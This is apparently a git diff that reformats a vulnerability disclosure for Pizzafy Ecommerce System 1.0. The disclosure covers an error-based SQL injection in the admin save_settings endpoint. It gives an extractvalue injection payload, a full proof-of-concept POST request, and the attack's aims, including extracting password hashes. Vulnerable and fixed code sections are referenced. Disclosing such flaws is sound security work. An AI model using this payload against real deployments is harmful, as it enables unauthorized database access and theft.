@@ -1,19 +1,17 @@
-# Pizzafy_1
+# Pizzafy Ecommerce System 1.0
 
-Pizzafy Ecommerce System 1.0
-
-Vulnerability Type: SQL Injection (Based Error)  - SAVE SETTINGS
-Severity: HIGH  
+Vulnerability Type: SQL Injection (Error Based) - SAVE SETTINGS
+Severity: HIGH
 
 Link to Download: https://www.sourcecodester.com/php/18708/pizzafy-ecommerce-system.html
 
-Vulnerable Endpoint:  
+Vulnerable Endpoint:
 pizzafy/admin/ajax.php?action=save_settings
 
-Query to SQL Injection
+SQL Injection Query:
 name=Test', name = extractvalue(1, concat(0x7e, database())) -- 
 
-Request to SQL Injection (Proof Of Concept)
+Proof of Concept (PoC) Request:
 
 POST /pizzafy/admin/ajax.php?action=save_settings HTTP/1.1
 Host: localhost
@@ -50,7 +48,7 @@ Content-Disposition: form-data; name="contact"
 ------WebKitFormBoundaryMCQk8kVG7lc51OEW
 Content-Disposition: form-data; name="about"
 
-<h1 style="margin-bottom: 0px; padding: 0px; line-height: 90px; color: rgb(0, 0, 0); text-align: center; font-size: 70px; font-family: DauphinPlain;">Pizzafy</h1><h4 style="text-align: center; margin: 10px 10px 5px; padding: 0px; font-size: 14px; line-height: 18px; font-style: italic;" open="" sans",="" arial,="" sans-serif;"=""><span style="font-size: 14px; text-align: left;"><font color="#000000">This is Pizzafy E-commerce.</font></span></h4><p></p><p></p><p></p><p></p>
+<h1 style="margin-bottom: 0px; padding: 0px; line-height: 90px; color: rgb(0, 0, 0); text-align: center; font-size: 70px; font-family: DauphinPlain;">Pizzafy</h1><h4 style="text-align: center; margin: 10px 10px 5px; padding: 0px; font-size: 14px; line-height: 18px; font-style: italic;" open="" sans", arial, sans-serif;"=""><span style="font-size: 14px; text-align: left;"><font color="#000000">This is Pizzafy E-commerce.</font></span></h4><p></p><p></p><p></p><p></p>
 ------WebKitFormBoundaryMCQk8kVG7lc51OEW
 Content-Disposition: form-data; name="img"; filename=""
 Content-Type: application/octet-stream
@@ -58,11 +56,9 @@ Content-Type: application/octet-stream
 
 ------WebKitFormBoundaryMCQk8kVG7lc51OEW--
 
-```
-
 Error-Based SQL Injection Vulnerability in UPDATE Operations
-An error-based SQL Injection vulnerability has been identified in the UPDATE functionalities of Pizzafy Ecommerce System 1.0. The issue arises due to improper sanitization of the `name` parameter, which allows an attacker to inject malicious SQL statements into backend database queries. This can lead to unauthorized data access, data manipulation, or disclosure of sensitive information through database error messages.
 
+An error-based SQL Injection vulnerability has been identified in the UPDATE functionalities of Pizzafy Ecommerce System 1.0. The issue arises due to improper sanitization of the `name` parameter, which allows an attacker to inject malicious SQL statements into backend database queries. This can lead to unauthorized data access, data manipulation, or disclosure of sensitive information through database error messages.
 
 Attack Technique
 
@@ -72,8 +68,6 @@ This attack leverages an error-based SQL injection technique, in which the attac
 * Extract sensitive data such as usernames and password hashes
 * Modify or delete critical records within the database
 * Potentially escalate privileges by retrieving and abusing session-related data
-
-
 
 Vulnerable Code
 
@@ -122,8 +116,8 @@ public function save_settings() {
     }
 }
 
+Fixed Code
 
-FIX CODE
 public function save_settings() {
     extract($_POST);
     
@@ -168,4 +162,5 @@ public function save_settings() {
 }
 
 References
+
 CWE-89: Improper Neutralization of Special Elements used in an SQL Command
